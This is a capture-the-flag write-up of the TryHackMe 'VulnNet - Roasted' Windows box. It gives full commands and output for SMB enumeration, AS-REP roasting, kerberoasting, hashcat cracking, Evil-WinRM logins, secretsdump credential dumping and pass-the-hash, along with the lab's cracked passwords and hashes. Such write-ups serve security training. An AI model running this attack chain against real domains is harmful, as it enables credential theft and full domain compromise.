---
layout: post
author: Siddhant Chouhan
title: TryHackMe VulnNet - Roasted Writeup
date: 2021-05-17 12:20:00 +0530
categories: [TryHackMe, Windows Machines]
tags: [tryhackme, VulnNet, ctf, crackmapexec, smbclient, kerberos, as-rep-roast, hashcat, kerberoasting, impacket, smbmap, evil-winrm]
image: /assets/img/Posts/roasted.png
---

## Overview:

This windows box involves 3 Active Directory attacks <code class="language-plaintext highlighter-rouge">AS-REP Roasting</code> followed by <code class="language-plaintext highlighter-rouge">Kerberoasting</code> and finally a <code class="language-plaintext highlighter-rouge">DC Sync</code> to get the administrator NTLM hash. The box starts with us finding out that we have anonymous read access to the <code class="language-plaintext highlighter-rouge">IPC$</code> smb share which means we can enumerate domain users with help of impacket's <code class="language-plaintext highlighter-rouge">lookupsid.py</code>. We then pass the username list to kerberos and perform <code class="language-plaintext highlighter-rouge">AS-REP Roasting</code>, We get a <code class="language-plaintext highlighter-rouge"> KRB5 ASREP</code> hash which we crack using <code class="language-plaintext highlighter-rouge">hashcat </code>. With the credentials we get we then perform a <code class="language-plaintext highlighter-rouge">kerberoasting</code> attack and get a <code class="language-plaintext highlighter-rouge">KRB5 TGS</code> hash which after cracking we are able to get on the box via <code class="language-plaintext highlighter-rouge">Evil-WinRM</code>. We find that we have read access to another share now and inside that share we find a visual basic script which has hard coded credentials for a user which turns out to be a domain admin. We perform a <code class="language-plaintext highlighter-rouge">DC Sync</code> to get the administrator hash and login to the box via Evil-WinRM.

--------------------- | ---------------------  
Machine Link          | [https://tryhackme.com/room/vulnnetroasted](https://tryhackme.com/room/vulnnetroasted)      
Operating System      | Windows
Difficulty            | Easy
Machine Created by    | [TheCyb3rW0lf](https://tryhackme.com/p/TheCyb3rW0lf)


  
## Enumeration

### Nmap Scan
```sql

Nmap scan report for 10.10.171.0
Host is up, received echo-reply ttl 127 (0.19s latency).
Scanned at 2021-05-18 16:58:25 IST for 117s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-05-18 11:29:07Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49758/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 20s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 64768/tcp): CLEAN (Timeout)
|   Check 2 (port 12249/tcp): CLEAN (Timeout)
|   Check 3 (port 20268/udp): CLEAN (Timeout)
|   Check 4 (port 61848/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-18T11:30:01
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:00
Completed NSE at 17:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:00
Completed NSE at 17:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:00
Completed NSE at 17:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.24 seconds
           Raw packets sent: 24 (1.032KB) | Rcvd: 21 (908B)

```
From the nmap scan we find that the Domain Name is <code class="language-plaintext highlighter-rouge">vulnnet-rst.local</code>.

### Enumerating SMB Shares

```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ smbmap -H 10.10.171.0 -u anonymous 
[+] Guest session       IP: 10.10.171.0:445     Name: 10.10.171.0                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing

```
Since the IPC$ Share is readable we can enumerate valid domain users via impacket's <code class="language-plaintext highlighter-rouge">lookupsid.py</code>.

```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@10.10.171.0 | tee usernames
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.171.0
[*] StringBinding ncacn_np:10.10.171.0[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```
Now let's extract all the Users from this output.

```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ cat usernames | grep SidTypeUser  |gawk -F '\' '{ print $2 }' |gawk -F ' ' '{ print $1 }' |tee usernames
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```
### Performing AS-REP Roasting

We can use GetNPUsers.py from impacket which can check if there are any valid usernames and if they don’t require Kerberos pre-authentication(PREAUTH) enabled. From the nmap scan we know that the domain name is vulnnet-rst.local.

```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.171.0 -usersfile usernames -outputfile asrep_hashes.txt -no-pass vulnnet-rst.local/
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set 

┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ cat asrep_hashes.txt 
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:5fc8fd3e6cba6ae02d3a3dbc1352e6ea$6c5be52cc57e029f64446e2215c45ecdf49b72f5e324d61e531208421405651e79db6e6bb8e54633e51a5f0b2b637216e5e102a50e33e5cb1d91fcbd118115e36b45613cafd262155aa95c4f0629866f5b3b74d41bbc064b06d0377299f0fe63edbdf23392708fc78353d9d5a47f51d0daeb7a1870c76dad5b2fdded9f8e3d69779eb9848291aa303a16620eb813ceaf8d28bc8bdca6fb52aab47f606b8167a135c43f3a6b6de4f3790b0a358c6c47456c2983ad109f94d06dd31d4cd72308849f11182eeeb5af19eb6ff7dbbb4f0519b65d75d3903707ec705007c56edf88b984c62cd8b9d883f5d789b3aec73abeac1dbe96d08458
```
### Cracking the KRB5 AS-REP hash using hashcat

```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

Dictionary cache built:                                                                                                                
* Filename..: /usr/share/wordlists/rockyou.txt                                                                                         
* Passwords.: 14344392                                                                                                                 
* Bytes.....: 139921507                                                                                                                
* Keyspace..: 14344385                                                                                                                 
* Runtime...: 2 secs


$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:5fc8fd3e6cba6ae02d3a3dbc1352e6ea$6c5be52cc57e029f64446e2215c45ecdf49b72f5e324d61e531208421405651e79db6e6bb8e54633e51a5f0b2b637216e5e102a50e33e5cb1d91fcbd118115e36b45613cafd262155aa95c4f0629866f5b3b74d41bbc064b06d0377299f0fe63edbdf23392708fc78353d9d5a47f51d0daeb7a1870c76dad5b2fdded9f8e3d69779eb9848291aa303a16620eb813ceaf8d28bc8bdca6fb52aab47f606b8167a135c43f3a6b6de4f3790b0a358c6c47456c2983ad109f94d06dd31d4cd72308849f11182eeeb5af19eb6ff7dbbb4f0519b65d75d3903707ec705007c56edf88b984c62cd8b9d883f5d789b3aec73abeac1dbe96d08458:tj072889*
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:5fc8fd3e6cba...d08458
Time.Started.....: Tue May 18 17:21:56 2021 (5 secs)
Time.Estimated...: Tue May 18 17:22:01 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   659.9 kH/s (7.00ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3178496/14344385 (22.16%)
Rejected.........: 0/3178496 (0.00%)
Restore.Point....: 3170304/14344385 (22.10%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: tkwyr9nrj8 -> tj030499

Started: Tue May 18 17:21:15 2021
Stopped: Tue May 18 17:22:03 2021
``` 
Hashcat was able to successfully crack the hash and the password for the account t-skid is tj072889*

### Performing Kerberoasting with t-skid's credentials

Since we have a valid credential now we can perform kerberoasting to obtain a KRB5 TGS Hash for the domain Service Principal Names (SPNs) which are used to identify service accounts in Microsoft Windows.


```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.171.0 'vulnnet-rst.local/t-skid:tj072889*' -outputfile kerberoasting_hashes.txt
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-12 01:15:09.913979  2021-03-14 05:11:17.987528   

```

```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ cat kerberoasting_hashes.txt 
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$a3989f0b4e622fc4eb8d4350bd5deac6$ae94711fe68d940e4156944e05f01d4767c1d91dabf7655d4bf4175702dc81d1b3cf34c0e25f35314fe8d15cc59ff943b2e68b64cf148127299111f2fa2df2487dc9ee156b047801a7aed6c9a7aa00452cbf2aefb0f8bda2f4fbb15e37b677e4aec37cc487b82082ef583e3011c736198fb9d5aa631d41339cbd7ccf91884b1ae26ef91731558f30733f8515136f821b83fd96203b5e2126239c114f9b99eca8ff37533d2268cba6ea2e2cae244cc7b4ab4344422a4bc3e1c056d354f33225820d996a1b562fbcee893a034b78b004ba3794812ffa3b80451178501e8e726b64e09010fe10d15ad0a8925a097f78cc8d2e7a072e0514dacbaaae4e20a23c80b5e4fe6201e266de021eebd8a9c09be2bdad1d7b16ccd13dc1fb022e0ca72ab4d88374ca4e8204057386b19c6171c866127ed813fb387cf563fd233990faadcafdb2dce6061a5c11c5236c197562902754b15048eb3ac52db3204e942ba4cd80e1c64f9d3063015bab25fd57ae0465448a9c24ebaa6076298fd957e7e42667d57f8a75527b32461c878a8b69c103b3d156974f1ae24124f3343268d7add678c204cab8f3efb073722ebd33fcda0862b83257a65f4b9fda94ea351980e0cafa7d844f35cd9983e1dd18a3e2503718ff0ec5a7a7733062f1908ede99b2ec0954af54545d064907f54696619ad9ef38a4b6fce5349ede265cbfa473a5931f457f4c760e7ce2b2cd73386a617f9c6297da96231f3029486f15db1367c61b316b98685a2ba7ef4decdc099312fd4dd71121dc9b75c7cff7967964cbabe93966b8565b0db8b7f1375463f221524d5875abad79bb99693db42cd4f0fb824199363906a5ca1196347709e785a718480fd2815d1d1ec7cd15da7801bb60d843f0f4c01053bcdb72df390eb77582ab74ef40d6d3d868bcb8e3f24303662c768ee517526ea5e81516f7d9b3c02c6161604fe650cd27bf91a128857c03eab56d1303923124502a828fc8f15c9b7f494ba202d0e10440de99600e3c5aea1de3910f9e8b80c55ad34f43a544025466ab5b01742a336a7e7b4588118c4b49c2113c8ed2dd4cc9068cafd6f80d88a10e62126ec70595b09c206ab36bcbc4b8614bc70e1099bc3d8c3de75cfc22ba91734c6149519563fdc18211fd100cb444ba827df8e80df4174c3794f95bce581e81f4ba3f97df1115fc5901c88eb84bc4aee7f7d42fb22378b20e8fc6db36602a94b4f4ae273162f4c078b11bd481c1eb61e9db9fd6fd8797c800838b29842089f5571cd9a7913baac2c76e7b356b6d02b7b40b48efdf76aaf84a7ffca0e1a579a3b723b5adc3be0cd448946a4b1c8a64d86c653a487360df5e71e9a5af85c4c38fb2a1ceded805d84ed07ac439b7926e0a8386d1f3c647
```
### Cracking the KRB5 TGS hash using hashcat

```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ hashcat -m 13100 kerberoasting_hashes.txt /usr/share/wordlists/rockyou.txt

Dictionary cache hit:                                                                                                                  
* Filename..: /usr/share/wordlists/rockyou.txt                                                                                         
* Passwords.: 14344385                                                                                                                 
* Bytes.....: 139921507                                                                                                                
* Keyspace..: 14344385

$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$a3989f0b4e622fc4eb8d4350bd5deac6$ae94711fe68d940e4156944e05f01d4767c1d91dabf7655d4bf4175702dc81d1b3cf34c0e25f35314fe8d15cc59ff943b2e68b64cf148127299111f2fa2df2487dc9ee156b047801a7aed6c9a7aa00452cbf2aefb0f8bda2f4fbb15e37b677e4aec37cc487b82082ef583e3011c736198fb9d5aa631d41339cbd7ccf91884b1ae26ef91731558f30733f8515136f821b83fd96203b5e2126239c114f9b99eca8ff37533d2268cba6ea2e2cae244cc7b4ab4344422a4bc3e1c056d354f33225820d996a1b562fbcee893a034b78b004ba3794812ffa3b80451178501e8e726b64e09010fe10d15ad0a8925a097f78cc8d2e7a072e0514dacbaaae4e20a23c80b5e4fe6201e266de021eebd8a9c09be2bdad1d7b16ccd13dc1fb022e0ca72ab4d88374ca4e8204057386b19c6171c866127ed813fb387cf563fd233990faadcafdb2dce6061a5c11c5236c197562902754b15048eb3ac52db3204e942ba4cd80e1c64f9d3063015bab25fd57ae0465448a9c24ebaa6076298fd957e7e42667d57f8a75527b32461c878a8b69c103b3d156974f1ae24124f3343268d7add678c204cab8f3efb073722ebd33fcda0862b83257a65f4b9fda94ea351980e0cafa7d844f35cd9983e1dd18a3e2503718ff0ec5a7a7733062f1908ede99b2ec0954af54545d064907f54696619ad9ef38a4b6fce5349ede265cbfa473a5931f457f4c760e7ce2b2cd73386a617f9c6297da96231f3029486f15db1367c61b316b98685a2ba7ef4decdc099312fd4dd71121dc9b75c7cff7967964cbabe93966b8565b0db8b7f1375463f221524d5875abad79bb99693db42cd4f0fb824199363906a5ca1196347709e785a718480fd2815d1d1ec7cd15da7801bb60d843f0f4c01053bcdb72df390eb77582ab74ef40d6d3d868bcb8e3f24303662c768ee517526ea5e81516f7d9b3c02c6161604fe650cd27bf91a128857c03eab56d1303923124502a828fc8f15c9b7f494ba202d0e10440de99600e3c5aea1de3910f9e8b80c55ad34f43a544025466ab5b01742a336a7e7b4588118c4b49c2113c8ed2dd4cc9068cafd6f80d88a10e62126ec70595b09c206ab36bcbc4b8614bc70e1099bc3d8c3de75cfc22ba91734c6149519563fdc18211fd100cb444ba827df8e80df4174c3794f95bce581e81f4ba3f97df1115fc5901c88eb84bc4aee7f7d42fb22378b20e8fc6db36602a94b4f4ae273162f4c078b11bd481c1eb61e9db9fd6fd8797c800838b29842089f5571cd9a7913baac2c76e7b356b6d02b7b40b48efdf76aaf84a7ffca0e1a579a3b723b5adc3be0cd448946a4b1c8a64d86c653a487360df5e71e9a5af85c4c38fb2a1ceded805d84ed07ac439b7926e0a8386d1f3c647:ry=ibfkfv,s6h,
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$v...f3c647
Time.Started.....: Tue May 18 17:53:22 2021 (7 secs)
Time.Estimated...: Tue May 18 17:53:29 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   630.4 kH/s (7.35ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4112384/14344385 (28.67%)
Rejected.........: 0/4112384 (0.00%)
Restore.Point....: 4104192/14344385 (28.61%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: ryannb<3 -> rutie12

Started: Tue May 18 17:52:58 2021
Stopped: Tue May 18 17:53:30 2021

```

```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ crackmapexec winrm -u enterprise-core-vn  -p 'ry=ibfkfv,s6h,' -x whoami 10.10.171.0 
WINRM       10.10.171.0   5985   WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local)
WINRM       10.10.171.0   5985   WIN-2BO8M1OE1M1  [*] http://10.10.171.0:5985/wsman
WINRM       10.10.171.0   5985   WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\enterprise-core-vn:ry=ibfkfv,s6h, (Pwn3d!)
WINRM       10.10.171.0   5985   WIN-2BO8M1OE1M1  [+] Executed command
WINRM       10.10.171.0   5985   WIN-2BO8M1OE1M1  vulnnet-rst\enterprise-core-vn


```

Crackmapexec says (Pwn3d!) for WINRM, we can login via EvilWinRM to the box.

```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ evil-winrm -i 10.10.171.0 -u enterprise-core-vn -p 'ry=ibfkfv,s6h,'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> whoami
vulnnet-rst\enterprise-core-vn

```

The user flag can be obtained from the user's desktop.

## Privilege Escalation

We find that we have read access to the NETLOGON and SYSVOL smb shares with credentials of the user enterprise-core-vn

```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ crackmapexec smb 10.10.171.0 --shares -u enterprise-core-vn -p 'ry=ibfkfv,s6h,'
SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\enterprise-core-vn:ry=ibfkfv,s6h, 
SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  [+] Enumerated shares
SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  NETLOGON        READ            Logon server share 
SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  SYSVOL          READ            Logon server share 
SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ    VulnNet Business Sharing
SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ  VulnNet Enterprise Sharing 

```

```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ smbclient -U enterprise-core-vn  //10.10.171.0/NETLOGON
Enter WORKGROUP\enterprise-core-vn's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Mar 17 04:45:49 2021
  ..                                  D        0  Wed Mar 17 04:45:49 2021
  ResetPassword.vbs                   A     2821  Wed Mar 17 04:48:14 2021

                8771839 blocks of size 4096. 4523233 blocks available
smb: \> get ResetPassword.vbs
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)
smb: \> exit

```

```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ head -n 20 ResetPassword.vbs 
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

' Determine DNS domain name from RootDSE object.

```
We find credentials hardcoded in a visual basic script a-whithat:bNdKVkjv3RR9ht 


```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ crackmapexec winrm -u a-whitehat -p bNdKVkjv3RR9ht -x whoami 10.10.171.0
WINRM       10.10.171.0   5985   WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local)
WINRM       10.10.171.0   5985   WIN-2BO8M1OE1M1  [*] http://10.10.171.0:5985/wsman
WINRM       10.10.171.0   5985   WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
WINRM       10.10.171.0   5985   WIN-2BO8M1OE1M1  [+] Executed command
WINRM       10.10.171.0   5985   WIN-2BO8M1OE1M1  vulnnet-rst\a-whitehat


```



```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ evil-winrm -i 10.10.171.0 -u a-whitehat -p bNdKVkjv3RR9ht                                                                      
                                                                                                                                       
Evil-WinRM shell v2.4                                                                                                                  
                                                                                                                                       
Info: Establishing connection to remote endpoint                                                                                       
                                                                                                                                       
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                          Attributes
================================================== ================ ============================================ ===============================================================
Everyone                                           Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                      Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
VULNNET-RST\Domain Admins                          Group            S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled group
VULNNET-RST\Denied RODC Password Replication Group Alias            S-1-5-21-1589833671-435344116-4136949213-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288


```

The user a-whithat is a domain admin, we can perform a DCSync attack to get the administrator hash and login via EvilWinRM.

### Performing a DC Sync attack to get the Administrator hash

```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py a-whitehat@10.10.171.0
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)


```

```shell
┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
└─$ evil-winrm -i 10.10.171.0 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d 

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
vulnnet-rst\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::d4e2:b2ca:aa85:e442%6
   IPv4 Address. . . . . . . . . . . : 10.10.171.0
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

The flag can be obtained from the administrator's desktop.

And that was the box, hope you liked my writeup if you have any doubts you can contact me on twitter :D
